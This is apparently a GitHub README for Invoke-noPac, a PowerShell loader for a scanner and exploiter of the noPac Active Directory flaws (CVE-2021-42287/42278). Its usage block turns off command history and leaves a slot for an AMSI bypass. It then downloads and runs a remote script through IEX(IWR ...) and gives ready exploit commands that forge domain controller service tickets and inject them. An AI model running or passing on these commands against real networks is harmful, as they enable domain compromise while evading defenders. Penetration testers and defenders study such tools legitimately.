# Invoke-noPac

## The .Net assembly is based on my fork https://github.com/ricardojba/noPac that has a few code changes to improve upon the original.

[PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) style .Net Assembly loader for the [CVE-2021-42287 - CVE-2021-42278] Scanner & Exploiter [noPac](https://github.com/ricardojba/noPac).

Usage:

```
Set-PSReadlineOption -HistorySaveStyle SaveNothing

<Insert-Your-AMSI-Bypass-From-AMSI.FAIL-Here>

[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[system.net.webrequest]::defaultwebproxy = new-object system.net.webproxy('http://proxy:8080')
[system.net.webrequest]::defaultwebproxy.BypassProxyOnLocal = $true
[system.net.webrequest]::defaultwebproxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
# [system.net.webrequest]::defaultwebproxy.credentials = Get-Credential

IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-noPac/main/Invoke-noPac.ps1')

Invoke-noPac
Invoke-noPac -Command "scan -domain full.domain -user domain_user -pass Password123!"
Invoke-noPac -Command "scan -domain full.domain -user domain_user -pass Password123! /enctype rc4"
Invoke-noPac -Command "-domain full.domain -user domain_user -pass Password123! /enctype rc4 /dc dc.full.domain /mAccount testmachine /mPassword testmachinepass /service cifs /ptt"
```

## Credits

[cube0x0](https://twitter.com/cube0x0) for the original [noPac](https://github.com/cube0x0/noPac).
